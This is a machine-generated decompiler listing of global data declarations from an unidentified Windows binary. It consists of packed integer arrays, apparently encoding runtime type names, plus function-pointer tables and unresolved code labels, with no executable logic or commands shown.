int dword_4076B0[5] = { 1933657360, 1953654131, 1181642601, 1701603681, 4230500 }; // weak
int dword_4077C8[3] = { 1397703944, 1869771333, 4230514 }; // weak
int dword_407838[2] = { 858653457, 1076 }; // weak
int dword_40785C[2] = { 875430673, 1076 }; // weak
int dword_4078D4[21] =
{
  1750357011,
  1684104562,
  1633906508,
  1970226028,
  1919251566,
  -725580852,
  3352553,
  -725581056,
  3392489,
  -725581056,
  3240937,
  -725581056,
  3304425,
  608469760,
  -1645620220,
  -2080374810,
  -737926076,
  -1655831,
  608470015,
  -974531580,
  -855638042
}; // weak
int dword_4079B0[10] =
{
  1968002084,
  1382642796,
  1164206437,
  1970037624,
  1702259059,
  1953067607,
  1853444965,
  1869768803,
  1702521198,
  4230514
}; // weak
int dword_407BF0 = 25637; // weak
int dword_407C24 = 25637; // weak
_UNKNOWN loc_407FF3; // weak
_UNKNOWN loc_407FFA; // weak
int dword_40800C = 3824686; // weak
int dword_408040 = 14940; // weak
int dword_408078 = 14940; // weak
int (*off_40894C)() = &sub_408979; // weak
_UNKNOWN loc_408A13; // weak
_UNKNOWN loc_408C83; // weak
_UNKNOWN loc_408F83; // weak
_UNKNOWN loc_408F8A; // weak
_UNKNOWN loc_409035; // weak
_UNKNOWN loc_40903C; // weak
_UNKNOWN loc_4090DF; // weak
_UNKNOWN loc_4090E6; // weak
int dword_4090F4 = 49; // weak
_UNKNOWN loc_4092C2; // weak
_UNKNOWN loc_4092C9; // weak
int dword_4092D8 = 49; // weak
int dword_4092DC[3] = { 26471, -1, 3 }; // weak
int dword_4092E8 = 6776679; // weak
int dword_409310[3] = { 25957, -1, 1 }; // weak
int dword_40931C = 101; // weak
int dword_4094AC = 0; // weak
int dword_4094B0 = 46; // weak
int dword_409564 = 2573; // weak
_UNKNOWN loc_4095FE; // weak
_UNKNOWN loc_409605; // weak
_UNKNOWN loc_4096CC; // weak
_UNKNOWN loc_4096D3; // weak
int dword_409704[4] = { 1163135246, 1919906418, 140731730, 16777216 }; // weak
int dword_409784[5] = { 1163135502, 1885692792, 1667584628, 8, 1 }; // weak
_UNKNOWN loc_409890; // weak
_UNKNOWN loc_409897; // weak
_UNKNOWN loc_409B37; // weak
_UNKNOWN loc_409B3E; // weak
_UNKNOWN loc_409C03; // weak
_UNKNOWN loc_409C0A; // weak
_UNKNOWN sub_409C14; // weak
_UNKNOWN loc_40A020; // weak
_UNKNOWN loc_40A027; // weak
int dword_40A1FC[8] = { 0, 0, 0, 0, 0, 0, 0, 0 }; // weak
_UNKNOWN loc_40A4E7; // weak
_UNKNOWN loc_40A4EE; // weak
int dword_40A4FC[3] = { 48, -1, 6 }; // weak
int dword_40A530[3] = { 28001, -1, 2 }; // weak
int dword_40A53C[3] = { 28016, -1, 1 }; // weak
int dword_40A548[3] = { 104, -1, 2 }; // weak
int dword_40A554[3] = { 26728, -1, 5 }; // weak
_UNKNOWN loc_40A62C; // weak
_UNKNOWN loc_40A633; // weak
_UNKNOWN loc_40AAFC; // weak
_UNKNOWN loc_40AB24; // weak
_UNKNOWN loc_40AC0A; // weak
_UNKNOWN loc_40AC11; // weak
_UNKNOWN loc_40ACAE; // weak
_UNKNOWN loc_40ACB5; // weak
_UNKNOWN loc_40AD41; // weak
_UNKNOWN loc_40AD48; // weak
_UNKNOWN loc_40ADF7; // weak
_UNKNOWN loc_40ADFE; // weak
int dword_40AE08[2] = { 0, 0 }; // weak
int dword_40AE18 = 29; // weak
int dword_40AF04 = 40; // weak
_UNKNOWN loc_40B25D; // weak
_UNKNOWN loc_40B2D0; // weak
int dword_40B2E4 = 30768; // weak
_UNKNOWN loc_40B5E9; // weak
_UNKNOWN loc_40BA71; // weak
_UNKNOWN loc_40BD05; // weak
_UNKNOWN loc_40BD3D; // weak
_UNKNOWN loc_40BEE5; // weak
int dword_40BEFC[4] = { 1398016014, 1631875700, 549236, 65536 }; // weak
int dword_40BF1C[4] = { 1431570446, 1850303859, 1077094, 196608 }; // weak
int dword_40BF4C[5] = { 1398017294, 1298427493, 1231841633, 409953902, 100663296 }; // weak
int dword_40BF98[2] = { 875430417, 4 }; // weak
_UNKNOWN loc_40C01D; // weak
_UNKNOWN loc_40C024; // weak
_UNKNOWN loc_40C1BA; // weak
_UNKNOWN loc_40C1C1; // weak
_UNKNOWN loc_40C4FF; // weak
_UNKNOWN loc_40C506; // weak
_UNKNOWN loc_40C5DF; // weak
_UNKNOWN loc_40C5E6; // weak
_UNKNOWN loc_40C6DE; // weak
_UNKNOWN loc_40C6E5; // weak
_UNKNOWN loc_40C78E; // weak
_UNKNOWN loc_40C795; // weak
_UNKNOWN loc_40CE1B; // weak
_UNKNOWN loc_40CE22; // weak
_UNKNOWN loc_40CFC0; // weak
_UNKNOWN loc_40CFC7; // weak
int dword_40D038[3] = { -306004284, -942617665, 0 }; // weak
int dword_40D04C[2] = { -88159798, 58828 }; // weak
_UNKNOWN loc_40D22A; // weak
_UNKNOWN loc_40D231; // weak
_UNKNOWN loc_40D296; // weak
_UNKNOWN loc_40D29D; // weak
int dword_40D358 = 92; // weak
_UNKNOWN loc_40D553; // weak
_UNKNOWN loc_40D55A; // weak
_UNKNOWN loc_40D623; // weak
_UNKNOWN loc_40D62A; // weak
int dword_40D6E0[3] = { 908984849, 4, 0 }; // weak
_UNKNOWN loc_40D894; // weak
_UNKNOWN loc_40D89B; // weak
int dword_40D8AC[3] = { 925762065, 4, 0 }; // weak
_UNKNOWN loc_40D9B4; // weak
_UNKNOWN loc_40D9BB; // weak
_UNKNOWN loc_40DA23; // weak
_UNKNOWN loc_40DA2A; // weak
_UNKNOWN loc_40DB30; // weak
_UNKNOWN loc_40DB37; // weak
int dword_40DB48[3] = { 12336, -1, 1 }; // weak
int dword_40DB54 = 32; // weak
_UNKNOWN loc_40DC64; // weak
_UNKNOWN loc_40DC6B; // weak
_UNKNOWN loc_40E1FB; // weak
_UNKNOWN loc_40E202; // weak
_UNKNOWN loc_40E22A; // weak
_UNKNOWN loc_40E231; // weak
int dword_40E2F4[3] = { 59, -1, 2 }; // weak
int dword_40E300[3] = { 2573, -1, 7 }; // weak
_UNKNOWN loc_40E3B9; // weak
_UNKNOWN loc_40E3C0; // weak
_UNKNOWN loc_40E41C; // weak
_UNKNOWN loc_40E423; // weak
_UNKNOWN loc_40E51B; // weak
_UNKNOWN loc_40E522; // weak
_UNKNOWN loc_40E620; // weak
_UNKNOWN loc_40E6E2; // weak
_UNKNOWN loc_40E6E9; // weak
_UNKNOWN loc_40E8B4; // weak
_UNKNOWN loc_40E8BB; // weak
_UNKNOWN loc_40EA43; // weak
_UNKNOWN loc_40EA4A; // weak
_UNKNOWN loc_40EB46; // weak
_UNKNOWN loc_40EB4D; // weak
int dword_40EB60 = 44; // weak
_UNKNOWN loc_40EB89; // weak
_UNKNOWN loc_40EC19; // weak
_UNKNOWN loc_40EDB0; // weak
_UNKNOWN loc_40EDB7; // weak
int dword_40EDC8[3] = { 44, -1, 1 }; // weak
int dword_40EDD8[2] = { -220989241, 0 }; // weak
_UNKNOWN loc_40F642; // weak
_UNKNOWN loc_40F649; // weak
int dword_40F670[3] = { 44, -1, 1 }; // weak
int dword_40F680 = 17481; // weak
int dword_40F684 = 20559; // weak
int dword_40F688 = 20558; // weak
int dword_40F68C[3] = { 17746, -1, 8 }; // weak
_UNKNOWN loc_40F81B; // weak
_UNKNOWN loc_40F822; // weak
int dword_40F838 = 3236474; // weak
int dword_40F868[3] = { 3302010, -1, 7 }; // weak
int dword_40F87C[3] = { 3367546, -1, 7 }; // weak
int dword_40F890[3] = { 3433082, -1, 7 }; // weak
int dword_40F8A4[3] = { 3498618, -1, 7 }; // weak
int dword_40F8B8[3] = { 3564154, -1, 7 }; // weak
int dword_40F8CC = 3629690; // weak
_UNKNOWN loc_410B3C; // weak
_UNKNOWN loc_410B43; // weak
int dword_410B6C[3] = { 2573, -1, 30 }; // weak
int dword_410BA0[3] = { 44, -1, 21 }; // weak
int dword_410BF4[3] = { 2763306, -1, 5 }; // weak
int dword_410C08[2] = { -220989241, 0 }; // weak
int dword_410C20[3] = { 17481, -1, 5 }; // weak
int dword_410C44 = 20563; // weak
int dword_410D28[4] = { -1328078816, 47281, -1, 5 }; // weak
int dword_410DB0[3] = { 20559, -1, 7 }; // weak
int dword_410DD4 = 17746; // weak
int dword_410E38[3] = { 16718, -1, 5 }; // weak
int dword_410E4C[3] = { 18754, -1, 6 }; // weak
int dword_410E60[3] = { 12625, -1, 6 }; // weak
int dword_410E74[3] = { 12609, -1, 6 }; // weak
int dword_410E88[3] = { 12881, -1, 6 }; // weak
int dword_410E9C[3] = { 12865, -1, 9 }; // weak
int dword_410EB4[3] = { 21838, -1, 13 }; // weak
int dword_410ED0[3] = { 20045, -1, 7 }; // weak
int dword_410F08[3] = { 3157552, -1, 2 }; // weak
int dword_410F14[3] = { 22048, -1, 200 }; // weak
int dword_410F20[51] =
{
  -87774045,
  -623585585,
  -1009534518,
  -943012683,
  -724901198,
  -1095637328,
  -1497781085,
  -791421756,
  -556795445,
  -1398552874,
  -1110770219,
  -1429281104,
  -860637484,
  -222566736,
  -659177807,
  -819403088,
  -690301738,
  -1176384325,
  -889334359,
  -1075400492,
  -1230521395,
  -1398593077,
  -692869162,
  -120730182,
  -724388910,
  -138891076,
  -860629290,
  -1497304368,
  -1398541392,
  -742595891,
  -1428934603,
  -506682702,
  -708859463,
  891872444,
  -1398593203,
  -876479053,
  -88364353,
  -1346972457,
  -791622700,
  -591156061,
  -1412895806,
  -1094003505,
  -1398545715,
  -539625513,
  -507790917,
  -87774275,
  -976173899,
  -843389745,
  -221197133,
  -1464405072,
  0
}; // weak
int dword_411018[5] = { -1143942984, -1177879868, 50131, -1, 6 }; // weak
int dword_41102C[4] = { -1110770219, 59056, -1, 50 }; // weak
int dword_4110DC[3] = { -724901198, -1095637328, 0 }; // weak
int dword_411170[3] = { 49, -1, 14 }; // weak
int dword_41117C[6] = { -136848974, -1278364209, 1852405562, 14393, -1, 16 }; // weak
int dword_411194[5] = { -136848974, -1278364209, 1852405562, 808464434, 0 }; // weak
_UNKNOWN loc_4112C0; // weak
_UNKNOWN loc_4112C7; // weak
_UNKNOWN loc_411351; // weak
_UNKNOWN loc_411358; // weak
_UNKNOWN loc_41183C; // weak
_UNKNOWN loc_411843; // weak
int dword_411878[3] = { 2573, -1, 12 }; // weak
_UNKNOWN loc_411DFC; // weak
_UNKNOWN loc_411E03; // weak
int dword_411E38[3] = { 2573, -1, 12 }; // weak
_UNKNOWN loc_411F61; // weak
_UNKNOWN loc_411F99; // weak
_UNKNOWN loc_412031; // weak
_UNKNOWN loc_412744; // weak
_UNKNOWN loc_41274B; // weak
_UNKNOWN loc_4128BC; // weak
_UNKNOWN loc_4128C3; // weak
_UNKNOWN loc_41292A; // weak
_UNKNOWN loc_412931; // weak
_UNKNOWN loc_412A0E; // weak
_UNKNOWN loc_412AD0; // weak
_UNKNOWN loc_412BC5; // weak
_UNKNOWN loc_412C31; // weak
_UNKNOWN loc_412C44; // weak
_UNKNOWN loc_41322C; // weak
_UNKNOWN loc_413233; // weak
_UNKNOWN loc_41327F; // weak
_UNKNOWN loc_413286; // weak
_UNKNOWN loc_4132EF; // weak
_UNKNOWN loc_4132F6; // weak
_UNKNOWN loc_41335D; // weak
_UNKNOWN loc_413364; // weak
int dword_413400[2] = { 0, 0 }; // weak
int dword_413484[2] = { 132096, 0 }; // weak
_UNKNOWN loc_41365F; // weak
_UNKNOWN loc_413666; // weak
_UNKNOWN loc_413753; // weak
_UNKNOWN loc_41375A; // weak
_UNKNOWN loc_4137A3; // weak
_UNKNOWN loc_4137AA; // weak
_UNKNOWN loc_413805; // weak
_UNKNOWN loc_41380C; // weak
_UNKNOWN loc_413A3C; // weak
_UNKNOWN loc_413A43; // weak
_UNKNOWN loc_413CB3; // weak
_UNKNOWN loc_413CBA; // weak
_UNKNOWN loc_413D38; // weak
_UNKNOWN loc_413D4A; // weak
_UNKNOWN loc_414028; // weak
_UNKNOWN loc_414644; // weak
_UNKNOWN loc_4148DE; // weak
_UNKNOWN loc_4148F4; // weak
_UNKNOWN loc_4148FB; // weak
_UNKNOWN loc_414A13; // weak
_UNKNOWN loc_414A1A; // weak
_UNKNOWN loc_414EF9; // weak
_UNKNOWN loc_414F00; // weak
_UNKNOWN loc_41524D; // weak
_UNKNOWN loc_415254; // weak
_UNKNOWN loc_4153BA; // weak
_UNKNOWN loc_4153C1; // weak
_UNKNOWN loc_415919; // weak
_UNKNOWN loc_415920; // weak
_UNKNOWN loc_415BD1; // weak
_UNKNOWN loc_415BD8; // weak
int dword_415BE4[3] = { 875430417, 4, 0 }; // weak
_UNKNOWN loc_415C67; // weak
_UNKNOWN loc_415C6E; // weak
_UNKNOWN loc_415DDB; // weak
_UNKNOWN loc_415DE2; // weak
_UNKNOWN loc_415F35; // weak
_UNKNOWN loc_415F3C; // weak
_UNKNOWN loc_415FFD; // weak
_UNKNOWN loc_416004; // weak
_UNKNOWN loc_41601A; // weak
_UNKNOWN loc_416021; // weak
_UNKNOWN loc_41609A; // weak
_UNKNOWN loc_41629E; // weak
_UNKNOWN loc_41637D; // weak
_UNKNOWN loc_4164A3; // weak
_UNKNOWN loc_4164AA; // weak
int dword_4164B8 = 30768; // weak
_UNKNOWN loc_416900; // weak
_UNKNOWN loc_416907; // weak
_UNKNOWN loc_416958; // weak
_UNKNOWN loc_41695F; // weak
_UNKNOWN loc_416AAC; // weak
_UNKNOWN loc_416AB3; // weak
_UNKNOWN loc_416B82; // weak
_UNKNOWN loc_416B89; // weak
_UNKNOWN loc_41714A; // weak
_UNKNOWN loc_417181; // weak
int dword_4171E0[4] = { 1951614220, 1835099506, 1869771333, 4230514 }; // weak
int dword_41723C[4] = { 1128678669, 1952540018, 1920091493, -1064603025 }; // weak
int dword_417298[3] = { 1330005259, 1164862832, 1919906418 }; // weak
int dword_417348[3] = { 1699890442, 1917150305, -1871548558 }; // weak
int dword_4173A0[3] = { 1918321931, 1164276841, 1919906418 }; // weak
int dword_4173F8[4] = { 1816347918, 1316189025, 1866888303, -1872466315 }; // weak
int dword_417454[3] = { 1766606090, 1917154419, -1871548558 }; // weak
int dword_4174AC[5] = { 1951614224, 1735289202, 1953720652, 1869771333, 4230514 }; // weak
int dword_41750C[4] = { 1866679567, 1852797037, 1165258341, 1919906418 }; // weak
int dword_417568[4] = { 1968129295, 1382436724, 1970238309, 1936024434 }; // weak
int (*off_417624[4])() = { &sub_418CA8, &nullsub_90, &sub_418B78, &sub_418BF4 }; // weak
int dword_417688[3] = { 1750357003, 1684104562, 1953720652 }; // weak
int (*off_4176E0[3])() = { &sub_419104, &nullsub_91, &sub_419020 }; // weak
int (*off_417884[10])() =
{
  &sub_419104,
  &nullsub_91,
  &sub_4193D0,
  &nullsub_92,
  &nullsub_93,
  &sub_419730,
  &nullsub_94,
  &nullsub_95,
  &sub_419468,
  &sub_4194E4
}; // weak
int (*off_417990[3])() = { &sub_419104, &sub_419984, &sub_419884 }; // weak
int dword_417A54[5] = { 1398016782, 1852404340, 1702119783, 2157, 256 }; // weak
int (*off_417AC0[23])() =
{
  &sub_419104,
  &sub_419984,
  &sub_419884,
  &sub_41A714,
  &sub_41A748,
  &sub_41A74C,
  &sub_41A750,
  &sub_419C68,
  &sub_41A8C4,
  &sub_41A920,
  &sub_41A9F4,
  &sub_41A318,
  &sub_41AA10,
  &sub_41AA84,
  &sub_41A4C8,
  &sub_41A4D4,
  &sub_4197CC,
  &sub_41A570,
  &sub_41A5B0,
  &sub_41A61C,
  &sub_419C14,
  &sub_41A7AC,
  &sub_419E1C
}; // weak
int (*off_417BD8)() = &nullsub_8; // weak
int (*off_417CC0)() = &sub_41AF14; // weak
int (*off_417DB0)() = &sub_41B1D0; // weak
int (*off_417E90)() = &sub_41B348; // weak
int (*off_417F20)() = &sub_41DAE4; // weak
int (*off_418058[7])() =
{
  &sub_419104,
  &sub_41FDDC,
  &sub_419020,
  &sub_41FEB4,
  &sub_41FD80,
  &sub_41FEC4,
  &sub_41FFBC
}; // weak
int dword_418170[6] = { 1230245390, 1953391972, 1164992845, 2037544046, 8, 1 }; // weak
int dword_4181DC[3] = { 1699894281, 1869760359, -1064603531 }; // weak
int dword_418234[3] = { 1699894282, 1869760359, -1871482763 }; // weak
_UNKNOWN loc_4185F3; // weak
_UNKNOWN loc_4185FA; // weak
_UNKNOWN loc_418670; // weak
_UNKNOWN loc_418677; // weak
_UNKNOWN loc_4186C2; // weak
_UNKNOWN loc_4186C9; // weak
_UNKNOWN loc_418712; // weak
_UNKNOWN loc_418719; // weak
int dword_418768[3] = { 1850299401, 1852785524, -1064602509 }; // weak
_UNKNOWN loc_418842; // weak
_UNKNOWN loc_418849; // weak
_UNKNOWN loc_4188BE; // weak
_UNKNOWN loc_4188C5; // weak
_UNKNOWN loc_4189F1; // weak
_UNKNOWN loc_4189F8; // weak
_UNKNOWN loc_418AF3; // weak
_UNKNOWN loc_418AFA; // weak
_UNKNOWN loc_418B10; // weak
_UNKNOWN loc_418B17; // weak
_UNKNOWN loc_418C74; // weak
_UNKNOWN loc_418C7B; // weak
_UNKNOWN loc_418EE9; // weak
_UNKNOWN loc_418F78; // weak
_UNKNOWN loc_418F7F; // weak
_UNKNOWN loc_418FDB; // weak
_UNKNOWN loc_418FE2; // weak
_UNKNOWN loc_4190EA; // weak
_UNKNOWN loc_4190F1; // weak
int dword_419100 = 7104878; // weak
_UNKNOWN loc_4191A5; // weak
_UNKNOWN loc_4191AC; // weak
int dword_419204[2] = { 0, 0 }; // weak
int dword_419304[4] = { -1183717369, 298967974, -1073696342, -1133530801 }; // weak
_UNKNOWN loc_419369; // weak
_UNKNOWN loc_419370; // weak
_UNKNOWN loc_41944E; // weak
_UNKNOWN loc_41945F; // weak
_UNKNOWN loc_4194D6; // weak
_UNKNOWN loc_4194DD; // weak
_UNKNOWN loc_4195EA; // weak
_UNKNOWN loc_4195F1; // weak
_UNKNOWN loc_419701; // weak
_UNKNOWN loc_419708; // weak
_UNKNOWN loc_419856; // weak
_UNKNOWN loc_41985D; // weak
_UNKNOWN loc_419873; // weak
_UNKNOWN loc_41987A; // weak
_UNKNOWN loc_4198FB; // weak
_UNKNOWN loc_41990C; // weak
_UNKNOWN loc_419A79; // weak
_UNKNOWN loc_419A80; // weak
_UNKNOWN loc_419B10; // weak
_UNKNOWN loc_419B17; // weak
_UNKNOWN loc_419BD6; // weak
_UNKNOWN loc_419BDD; // weak
_UNKNOWN loc_419BF8; // weak
_UNKNOWN loc_419BFF; // weak
_UNKNOWN loc_419C59; // weak
_UNKNOWN loc_419C60; // weak
_UNKNOWN loc_419D73; // weak
_UNKNOWN loc_419D7A; // weak
int dword_419D8C = 2573; // weak
_UNKNOWN loc_419E08; // weak
_UNKNOWN loc_419E0F; // weak
_UNKNOWN loc_419EC8; // weak
_UNKNOWN loc_419ECF; // weak
_UNKNOWN loc_419F90; // weak
_UNKNOWN loc_419F97; // weak
_UNKNOWN loc_41A01D; // weak
_UNKNOWN loc_41A024; // weak
_UNKNOWN loc_41A03A; // weak
_UNKNOWN loc_41A041; // weak
_UNKNOWN loc_41A0CC; // weak
_UNKNOWN loc_41A0D3; // weak
_UNKNOWN loc_41A0E9; // weak
_UNKNOWN loc_41A0F0; // weak
_UNKNOWN loc_41A1AB; // weak
_UNKNOWN loc_41A1B2; // weak
_UNKNOWN loc_41A1D0; // weak
_UNKNOWN loc_41A1D7; // weak
_UNKNOWN loc_41A227; // weak
_UNKNOWN loc_41A22E; // weak
_UNKNOWN loc_41A281; // weak
_UNKNOWN loc_41A288; // weak
_UNKNOWN loc_41A30B; // weak
_UNKNOWN loc_41A312; // weak
_UNKNOWN loc_41A3AF; // weak
_UNKNOWN loc_41A3B6; // weak
_UNKNOWN loc_41A3CC; // weak
_UNKNOWN loc_41A3D3; // weak
_UNKNOWN loc_41A452; // weak
_UNKNOWN loc_41A459; // weak
_UNKNOWN loc_41AE19; // weak
_UNKNOWN loc_41AE20; // weak
_UNKNOWN loc_41AE80; // weak
_UNKNOWN loc_41AE87; // weak
_UNKNOWN loc_41B157; // weak
_UNKNOWN loc_41B15E; // weak
void *off_41B398 = &loc_41B4C4; // weak
int (*off_41B410)() = &sub_41B4D4; // weak
_UNKNOWN loc_41B54B; // weak
_UNKNOWN loc_41B552; // weak
_UNKNOWN loc_41B5FE; // weak
_UNKNOWN loc_41B605; // weak
_UNKNOWN loc_41B6BB; // weak
_UNKNOWN loc_41B6C2; // weak
_UNKNOWN loc_41B743; // weak
_UNKNOWN loc_41B74A; // weak
_UNKNOWN loc_41B8F4; // weak
_UNKNOWN loc_41B8FB; // weak
_UNKNOWN loc_41BA1C; // weak
_UNKNOWN loc_41BA23; // weak
_UNKNOWN loc_41BB1A; // weak
_UNKNOWN loc_41BB21; // weak
_UNKNOWN loc_41BB37; // weak
_UNKNOWN loc_41BB3E; // weak
_UNKNOWN loc_41BD4B; // weak
_UNKNOWN loc_41BD52; // weak
_UNKNOWN loc_41BDF8; // weak
_UNKNOWN loc_41BDFF; // weak
_UNKNOWN loc_41BF3E; // weak
_UNKNOWN loc_41BF6A; // weak
_UNKNOWN loc_41C00C; // weak
_UNKNOWN loc_41C0AF; // weak
_UNKNOWN loc_41C239; // weak
_UNKNOWN loc_41C27B; // weak
_UNKNOWN loc_41C282; // weak
_UNKNOWN loc_41C29D; // weak
_UNKNOWN loc_41C2A4; // weak
_UNKNOWN loc_41C30B; // weak
_UNKNOWN loc_41C31C; // weak
_UNKNOWN loc_41C3E2; // weak
int dword_41C5E8[3] = { 7104878, -1, 4 }; // weak
_UNKNOWN loc_41C7ED; // weak
_UNKNOWN loc_41C7F4; // weak
_UNKNOWN loc_41C976; // weak
_UNKNOWN loc_41C99D; // weak
_UNKNOWN loc_41C9E8; // weak
_UNKNOWN loc_41C9EF; // weak
_UNKNOWN loc_41CB32; // weak
_UNKNOWN loc_41CB39; // weak
_UNKNOWN loc_41CE55; // weak
_UNKNOWN loc_41CE5C; // weak
_UNKNOWN loc_41CEE1; // weak
_UNKNOWN loc_41CF0E; // weak
_UNKNOWN loc_41CF15; // weak
_UNKNOWN loc_41D009; // weak
_UNKNOWN loc_41D010; // weak
_UNKNOWN loc_41D0EF; // weak
_UNKNOWN loc_41D0F6; // weak
_UNKNOWN loc_41D14C; // weak
_UNKNOWN loc_41D153; // weak
_UNKNOWN loc_41D39B; // weak
_UNKNOWN loc_41D3A2; // weak
_UNKNOWN loc_41D3E5; // weak
_UNKNOWN loc_41D3EC; // weak
_UNKNOWN loc_41D488; // weak
_UNKNOWN loc_41D48F; // weak
_UNKNOWN loc_41D53D; // weak
_UNKNOWN loc_41D544; // weak
_UNKNOWN loc_41D7A6; // weak
_UNKNOWN loc_41D7AD; // weak
_UNKNOWN loc_41D7CB; // weak
_UNKNOWN loc_41D7D2; // weak
_UNKNOWN loc_41D7F0; // weak
_UNKNOWN loc_41D7F7; // weak
int dword_41D7FC[4] = { -703881178, 1277845058, 473891259, -1901973361 }; // weak
_UNKNOWN loc_41DBC0; // weak
_UNKNOWN loc_41DBC7; // weak
_UNKNOWN loc_41DC2B; // weak
_UNKNOWN loc_41DC32; // weak
_UNKNOWN loc_41DCCA; // weak
_UNKNOWN loc_41DDF6; // weak
_UNKNOWN loc_41E13F; // weak
_UNKNOWN loc_41E181; // weak
_UNKNOWN loc_41E188; // weak
_UNKNOWN loc_41E1E0; // weak
_UNKNOWN loc_41E1E7; // weak
int dword_41E1FC = 46; // weak
int dword_41E37C = 7104878; // weak
_UNKNOWN loc_41E54D; // weak
_UNKNOWN loc_41E554; // weak
_UNKNOWN loc_41E5F8; // weak
_UNKNOWN loc_41E5FF; // weak
_UNKNOWN loc_41E68A; // weak
_UNKNOWN loc_41E691; // weak
_UNKNOWN loc_41E6F8; // weak
_UNKNOWN loc_41E6FF; // weak
_UNKNOWN loc_41E77D; // weak
_UNKNOWN loc_41E784; // weak
_UNKNOWN loc_41E79A; // weak
_UNKNOWN loc_41E7A1; // weak
_UNKNOWN loc_41E8CD; // weak
_UNKNOWN loc_41E8D4; // weak
_UNKNOWN loc_41EA8F; // weak
_UNKNOWN loc_41EA96; // weak
_UNKNOWN loc_41EAFC; // weak
_UNKNOWN loc_41EB03; // weak
_UNKNOWN loc_41EC0F; // weak
_UNKNOWN loc_41EC16; // weak
_UNKNOWN loc_41EE84; // weak
_UNKNOWN loc_41EE8B; // weak
_UNKNOWN loc_41EF08; // weak
_UNKNOWN loc_41EF0F; // weak
_UNKNOWN loc_41EFD4; // weak
_UNKNOWN loc_41EFDB; // weak
int dword_41EFE4[4] = { -494200744, 1163521158, 1332465039, -313441918 }; // weak
_UNKNOWN loc_41F0F7; // weak
_UNKNOWN loc_41F0FE; // weak
int dword_41F104[4] = { -494200744, 1163521158, 1332465039, -313441918 }; // weak
_UNKNOWN loc_41F23E; // weak
_UNKNOWN loc_41F245; // weak
_UNKNOWN loc_41F2C7; // weak
_UNKNOWN loc_41F2CE; // weak
_UNKNOWN loc_41F33C; // weak
_UNKNOWN loc_41F343; // weak
_UNKNOWN loc_41F771; // weak
_UNKNOWN loc_41F778; // weak
_UNKNOWN loc_41F7CC; // weak
_UNKNOWN loc_41F7D3; // weak
_UNKNOWN loc_41F7DD; // weak
_UNKNOWN loc_41F839; // weak
_UNKNOWN loc_41F840; // weak
int dword_41F848[4] = { -703881178, 1277845058, 473891259, -1901973361 }; // weak
_UNKNOWN loc_41F89E; // weak
_UNKNOWN loc_41F8A5; // weak
_UNKNOWN loc_41F9E1; // weak
_UNKNOWN loc_41F9E8; // weak
_UNKNOWN loc_41FA96; // weak
_UNKNOWN loc_41FA9D; // weak
int dword_41FE60 = 7368532; // weak
_UNKNOWN loc_420279; // weak
_UNKNOWN loc_420280; // weak
_UNKNOWN loc_420337; // weak
_UNKNOWN loc_4203F8; // weak
_UNKNOWN loc_420460; // weak
_UNKNOWN loc_4204A1; // weak
_UNKNOWN loc_420509; // weak
int dword_420520[5] = { 1129580033, 1919904879, 4, -128, 4230527 }; // weak
int dword_4205FC[21] =
{
  1179913217,
  1131703919,
  1936875880,
  95333,
  -16777216,
  -1879048192,
  -591363124,
  -1962898608,
  75977792,
  -1065106652,
  9130204,
  -2024259445,
  -2084363260,
  -603708348,
  69485707,
  1627324555,
  608469772,
  -840311804,
  -2080374901,
  -603708348,
  -7609367
}; // weak
int (*off_4206D4[3])() = { &sub_419104, &sub_42243C, &sub_419020 }; // weak
int (*off_42081C)() = &sub_42287C; // weak
int (*off_420878[3])() = { &sub_419104, &sub_42243C, &sub_422918 }; // weak
int dword_420950[5] = { 1699894288, 1920298867, 1632462179, 1701273966, 4230514 }; // weak
_UNKNOWN loc_421141; // weak
_UNKNOWN loc_421148; // weak
_UNKNOWN loc_421169; // weak
_UNKNOWN loc_421170; // weak
_UNKNOWN loc_421216; // weak
_UNKNOWN loc_42121D; // weak
_UNKNOWN loc_4212FD; // weak
_UNKNOWN loc_421304; // weak
_UNKNOWN loc_4213B8; // weak
_UNKNOWN loc_4213BF; // weak
_UNKNOWN loc_4216C2; // weak
_UNKNOWN loc_4216C9; // weak
_UNKNOWN loc_421768; // weak
_UNKNOWN loc_42176F; // weak
_UNKNOWN loc_421841; // weak
_UNKNOWN loc_421848; // weak
_UNKNOWN loc_4218D2; // weak
_UNKNOWN loc_4218D9; // weak
_UNKNOWN loc_421A1C; // weak
_UNKNOWN loc_421B02; // weak
_UNKNOWN loc_421B09; // weak
_UNKNOWN loc_421BBC; // weak
_UNKNOWN loc_421BC3; // weak
_UNKNOWN loc_421BDC; // weak
_UNKNOWN loc_421BE3; // weak
_UNKNOWN loc_421D71; // weak
_UNKNOWN loc_421D78; // weak
_UNKNOWN loc_421F3C; // weak
_UNKNOWN loc_421F43; // weak
_UNKNOWN loc_421F5F; // weak
_UNKNOWN loc_421F66; // weak
_UNKNOWN loc_421F7F; // weak
_UNKNOWN loc_421F86; // weak
_UNKNOWN loc_422175; // weak
_UNKNOWN loc_42217C; // weak
_UNKNOWN loc_42235F; // weak
_UNKNOWN loc_422366; // weak
_UNKNOWN loc_422386; // weak
_UNKNOWN loc_42238D; // weak
_UNKNOWN loc_4225A5; // weak
_UNKNOWN loc_4225AC; // weak
_UNKNOWN loc_4225C2; // weak
_UNKNOWN loc_4225C9; // weak
_UNKNOWN loc_422624; // weak
_UNKNOWN loc_42262B; // weak
_UNKNOWN loc_4226AF; // weak
_UNKNOWN loc_4226B6; // weak
_UNKNOWN loc_422752; // weak
_UNKNOWN loc_422759; // weak
_UNKNOWN loc_42277A; // weak
_UNKNOWN loc_422781; // weak
_UNKNOWN loc_42281C; // weak
_UNKNOWN loc_422823; // weak
_UNKNOWN loc_422B11; // weak
_UNKNOWN loc_422BC7; // weak
_UNKNOWN loc_422C30; // weak
int dword_422E1C[4] = { -2106818033, 1870798962, 1451447171, 1317233283 }; // weak
int dword_422E78[4] = { 1632654351, 1919251572, 1851870574, 1919248225 }; // weak
_UNKNOWN loc_422F4F; // weak
_UNKNOWN loc_422F56; // weak
_UNKNOWN loc_423045; // weak
int dword_423150[3] = { 825098769, 1, 0 }; // weak
_UNKNOWN loc_423294; // weak
_UNKNOWN loc_42329B; // weak
int dword_4232A8 = 108; // weak
_UNKNOWN loc_42335F; // weak
_UNKNOWN loc_423366; // weak
int dword_423374 = 49; // weak
_UNKNOWN loc_423481; // weak
_UNKNOWN loc_423488; // weak
_UNKNOWN loc_4234CC; // weak
_UNKNOWN loc_4234D3; // weak
_UNKNOWN loc_423699; // weak
_UNKNOWN loc_4236A0; // weak
_UNKNOWN loc_4236AA; // weak
_UNKNOWN loc_4236E8; // weak
_UNKNOWN loc_4236EF; // weak
